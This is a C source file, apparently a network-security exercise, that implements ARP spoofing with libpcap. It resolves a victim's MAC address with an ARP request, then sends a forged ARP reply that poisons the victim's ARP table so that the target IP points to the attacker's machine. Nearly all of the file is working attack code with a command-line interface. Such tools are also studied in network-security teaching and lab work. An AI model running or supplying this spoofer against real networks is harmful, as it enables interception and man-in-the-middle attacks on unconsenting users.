/*
 * Author : Jinkyoung Kim
 * Contact : kjkjk1178@gmail.com
 *
 * This program changes victim's arp table
 * 
 */

#include <pcap.h>
#include <stdio.h>
#include <netinet/ether.h>
#include <string.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <linux/if.h>
#include <netdb.h>
#include <netinet/in.h>
#include <linux/ip.h>
#include <unistd.h>
#include <stdlib.h> 
#include <signal.h>

#define ETHERSIZE 14
#define IPADDRLEN 4
#define PACKETLEN 0x2a

//--- Struct definition ---

#pragma pack(1) //패딩 삭제
typedef struct myArphdr
{
    uint16_t hardType;		
    uint16_t protoType;	
    uint8_t hardLen;		
    uint8_t protoLen;		
    uint16_t opcode;		

    uint8_t srcMAC[ETH_ALEN];	
    uint32_t srcIP;		
    uint8_t dstMAC[ETH_ALEN];	
    uint32_t dstIP;

}ARPHDR;

//___ Struct definition ___

uint8_t * g_bufAddr;
pcap_t * g_handle;

//--- Function declaration ---

void GetMyAddr(uint8_t * , uint8_t * , uint32_t * );
bool GetVictimMAC(uint8_t * , uint8_t * , uint8_t * , uint32_t );
bool IsARPNext(uint16_t );
bool IsVictim(uint32_t , uint32_t );
bool MakeARP(uint8_t , uint8_t * , uint8_t * , uint8_t * , uint32_t , uint32_t );
void MakeEtherHeader(struct ether_header * , uint8_t * , uint8_t * );
void Send();

//___ Function declaration ___


//--- Function definition ---


int main(int argc, char * argv[])
{
    pcap_t * handle;

    uint8_t myMAC[ETH_ALEN];
    uint8_t victimMAC[ETH_ALEN];
    uint32_t victimIP;
    uint32_t targetIP;
    uint32_t myIP;

    if(argc !=4)
    {
        printf("usage : send_arp <interface> <sender ip> <target ip>\n");
        return 1;
    }

    uint8_t errbuf[PCAP_ERRBUF_SIZE];
    handle = pcap_open_live(argv[1], BUFSIZ, 1, 1000, (char *)errbuf);
    g_handle = handle;

    if (handle == NULL) 
    {
        fprintf(stderr, "couldn't open device %s: %s\n", argv[1], errbuf);
        return -1;
    }

    uint8_t buf[PACKETLEN];
    memset(buf, 0, sizeof(buf));
    g_bufAddr = buf;

    victimIP = inet_addr(argv[2]);
    targetIP = inet_addr(argv[3]);


    GetMyAddr((uint8_t *)argv[1], myMAC, &myIP);


    //--- get victim's MAC ---
    
   
    MakeARP(ARPOP_REQUEST,buf, NULL, myMAC, victimIP, myIP);
    
    
    //get response
    bool getResponse = false;
    signal(SIGALRM, (__sighandler_t)Send);

    Send();


    while (!getResponse) 
    {
        struct pcap_pkthdr * header;
        const uint8_t * packet;

        int res = pcap_next_ex(handle, &header, &packet);
        if (res == 0) continue;
        if (res == -1 || res == -2) break;
        
        //ARP 응답인지 체크
        getResponse = GetVictimMAC((uint8_t *)packet, myMAC, victimMAC, victimIP);
        
        if(getResponse == true)
            break;
    
    }

    printf("success to get victime's MAC!\n");

    //___ get victim's MAC ___

    //--- ARP spoofing ---

    memset(buf, 0, sizeof(buf));

    MakeARP(ARPOP_REPLY, buf, victimMAC, myMAC, victimIP, targetIP);

    printf("do ARP spoofing...\n");
    pcap_sendpacket(handle, (const u_char *)buf, PACKETLEN);

    //___ ARP spoofing ___

} //int main(int argc, char * argv[])



void GetMyAddr(uint8_t * interface, uint8_t * myMAC, uint32_t * myIP)
{
    struct ifreq s;
    int fd = socket(PF_INET, SOCK_DGRAM, IPPROTO_IP);

    strcpy(s.ifr_name, (char *)interface);
    if (0 == ioctl(fd, SIOCGIFHWADDR, &s)) 
    {
        memcpy(myMAC, s.ifr_addr.sa_data, ETH_ALEN);
    }
    else
    {
        printf("Fail to get my MAC address!\n");
        exit(1);
    }

    s.ifr_addr.sa_family = AF_INET;

    if (0 == ioctl(fd, SIOCGIFADDR, &s))
    {
        * myIP = (uint32_t)(((struct sockaddr_in *)&s.ifr_addr)->sin_addr.s_addr);

    }
    else
    {
        printf("Fail to get my IP address!\n");
        exit(1);

    }

    close(fd);

} //void GetMyMAC(uint8_t * interface, uint8_t * myMAC)



bool GetVictimMAC(uint8_t * packet, uint8_t * myMAC, uint8_t * victimMAC, uint32_t victimIP)
{

    struct ether_header * eth = (struct ether_header *)packet;

    //수신한 패킷인지 체크
    if(memcmp(eth->ether_dhost, myMAC, ETH_ALEN))
    {
       return false; 
    }

    //arp 패킷인지 체크
    if(! IsARPNext(eth->ether_type))
        return false;

    ARPHDR * arp = (ARPHDR *)((uint8_t *)eth + ETHERSIZE);

    //victim에게 온 response인지 체크
    if(!IsVictim(arp->srcIP, victimIP))
    {
        return false;
    }

    //victim의 MAC 주소를 얻음
    memcpy(victimMAC, eth->ether_shost, ETH_ALEN);

    return true;

} //bool GetVictimMAC(uint8_t * packet, uint8_t * myMAC, uint8_t * victimMAC, uint32_t victimIP)


bool IsARPNext(uint16_t ethType)
{
    if (ntohs(ethType) == ETHERTYPE_ARP)
        return true;
    else  
        return false;

} //bool IsARPNext(uint16_t ethType)


bool IsVictim(uint32_t ip, uint32_t victimIP)
{
    if (victimIP == ip)
        return true;
    else
        return false;

} //bool IsVictim(uint32_t ip, uint32_t victimIP)


bool MakeARP(uint8_t arpType, uint8_t *buf, uint8_t * dstMAC, uint8_t * srcMAC, uint32_t dstIP, uint32_t srcIP)
{
    struct ether_header *eth = (struct ether_header * )buf;
    ARPHDR * arp = (ARPHDR *)((uint8_t *)buf + ETHERSIZE);
    uint8_t requestMAC[ETH_ALEN];

    switch(arpType)
    {
    case ARPOP_REQUEST: 
       
        //ethernet header for broadcast
        memset(requestMAC, 0xFF, sizeof(requestMAC));
        MakeEtherHeader(eth, requestMAC, srcMAC);

        //ARP dstMAC for request
        memset(requestMAC, 0x00, sizeof(requestMAC));
        dstMAC = requestMAC;
        
        break;

    case ARPOP_REPLY:

        MakeEtherHeader(eth, dstMAC, srcMAC); 
    
        break;

    } // switch(arpType)


    //header
    arp->hardType  = htons(ARPHRD_ETHER);
    arp->protoType = htons(ETHERTYPE_IP);
    arp->hardLen = ETH_ALEN;
    arp->protoLen = IPADDRLEN;
    arp->opcode = htons(arpType); 

    //내용
    memcpy((char *)arp->srcMAC, (char * )srcMAC, ETH_ALEN);
    arp->srcIP = srcIP;
    memcpy((char *)arp->dstMAC, (char * )dstMAC, ETH_ALEN);
    arp->dstIP = dstIP;

} //bool MakeARP(uint8_t arpType, uint8_t *buf, uint8_t * dstMAC, uint8_t * srcMAC, uint32_t dstIP, uint32_t srcIP)



void MakeEtherHeader(struct ether_header * eth, uint8_t * dstMAC, uint8_t * srcMAC)
{
    memcpy((char *)eth->ether_dhost, (char*) dstMAC, ETH_ALEN);
    memcpy((char *)eth->ether_shost, (char*) srcMAC, ETH_ALEN);    
    eth->ether_type = htons(ETHERTYPE_ARP);

} //void MakeEtherHeader(struct ether_header * eth, uint8_t * dstMAC, uint8_t * srcMAC)



void Send()
{
    printf("trying to get victime's MAC..\n");
    pcap_sendpacket(g_handle, (const u_char *)g_bufAddr, PACKETLEN);
    
    alarm(10);
} // void Send()


//___ Function definition ___